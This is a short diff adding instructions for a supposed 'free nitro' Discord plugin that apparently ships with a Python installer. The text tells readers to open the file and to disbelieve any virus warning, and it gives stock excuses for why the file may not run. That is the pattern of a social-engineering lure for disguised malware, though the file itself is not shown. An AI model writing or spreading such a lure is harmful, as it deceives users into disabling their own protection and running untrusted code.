@@ -1,0 +1,9 @@
+You need to download and install Python to run this plugin of free nitro.(Python Istaller given in this folder)
+
+Open the file then if it shows that the flie is a virus it's not as
+we have provided a plugin for Discord, YOU DON'T NEED TO DOWNLOAD ANYTHING ELSE.
+
+If the file doesn't open then there may be a newer version of the file available, or your PC does not meet the requirements of this
+program.
+
+Thanks for Installing,
